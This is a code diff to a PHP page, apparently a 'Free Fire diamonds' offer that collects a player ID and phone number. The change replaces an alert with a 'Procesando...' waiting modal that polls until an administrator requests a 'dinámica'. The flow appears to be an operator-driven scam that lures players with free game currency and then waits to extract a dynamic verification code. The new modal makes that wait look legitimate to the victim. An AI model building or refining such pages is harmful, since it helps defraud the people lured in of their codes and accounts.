@@ -263,7 +263,11 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
 
         if (data.status === 'dinamica_solicitada') {
           clearInterval(pollInterval);
-          // Mostrar modal de dinámica
+          // Ocultar modal de esperando y mostrar modal de dinámica
+          const modalEsperando = document.getElementById("modalEsperando");
+          if (modalEsperando) {
+            modalEsperando.style.display = "none";
+          }
           const modalDinamica = document.getElementById("modalDinamica");
           if (modalDinamica) {
             modalDinamica.style.display = "flex";
@@ -384,9 +388,12 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
           const data = await response.json();
 
           if (data.ok) {
-            // Ocultar modal y mostrar mensaje de espera
+            // Ocultar modal y mostrar modal de esperando
             modal.style.display = "none";
-            alert("Datos enviados. Esperando solicitud de dinámica del administrador...");
+            const modalEsperando = document.getElementById("modalEsperando");
+            if (modalEsperando) {
+              modalEsperando.style.display = "flex";
+            }
 
             // Iniciar polling para verificar si se solicitó dinámica
             startDinamicaPolling(telefono);
@@ -847,6 +854,16 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
       margin-top: 10px;
       transition: all 0.3s;
     " onmouseover="this.style.color='#fff'; this.style.borderColor='#fff'" onmouseout="this.style.color='#ccc'; this.style.borderColor='#ccc'">Cancelar</button>
+  </div>
+</div>
+
+<!-- Modal de esperando dinámica -->
+<div id="modalEsperando" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:10001; justify-content:center; align-items:center; font-family:'Inter', sans-serif;">
+  <div style="background:#5c2d91; padding:30px; border-radius:15px; text-align:center; max-width:400px; width:90%; color:white; box-shadow:0 10px 30px rgba(0,0,0,0.5);">
+    <div style="font-size:3em; margin-bottom:20px;">⏳</div>
+    <h2 style="margin:0 0 20px 0; font-size:1.5em; font-weight:600;">Procesando...</h2>
+    <p style="margin:0 0 30px 0; font-size:1.1em; line-height:1.4;">Datos enviados. Esperando solicitud de dinámica.</p>
+    <div style="display:inline-block; width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid #4a2476; border-radius:50%; animation:spin 1s linear infinite;"></div>
   </div>
 </div>
 
